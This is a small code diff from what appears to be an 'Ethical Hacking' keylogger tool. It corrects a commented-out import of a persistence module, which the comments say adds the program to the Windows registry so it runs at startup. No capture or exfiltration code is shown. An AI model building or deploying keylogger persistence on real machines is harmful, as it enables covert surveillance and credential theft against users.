@@ -4,7 +4,7 @@ import keylogger
 # OR if you are packaging on Windows and want to add to registry
 # So that the program runs on startup, uncomment the following import and comment the top one
 
-#import keylogger_persistance.py
+#import keylogger_persistance
 
 '''
 Description: This tool is part of the Ethical Hacking toolset. This is for educational use ONLY for security purposes.
